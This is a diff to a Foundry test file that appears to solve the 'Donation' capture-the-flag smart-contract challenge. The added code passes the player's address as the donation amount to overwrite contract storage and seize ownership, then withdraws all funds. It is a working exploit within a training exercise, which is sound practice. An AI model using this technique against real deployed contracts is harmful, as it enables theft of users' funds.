@@ -18,8 +18,25 @@ contract DonationTest is Test {
 
         // [START]
 
+        address player = address(this);
+
+        vm.startPrank(player);
+
+        // 1. Donate
+        uint256 etherAmount = uint256(uint160(player));
+        uint256 scale = 10 ** 18 * 1 ether;
+        uint256 etherSend = etherAmount / scale;
+        challenge.donate{value: etherSend}(etherAmount);
+
+        // 2. Withdraw
+        challenge.withdraw();
+
+        vm.stopPrank();
+
         // [END]
 
         assertTrue(challenge.isComplete());
     }
+
+    receive() external payable {}
 }
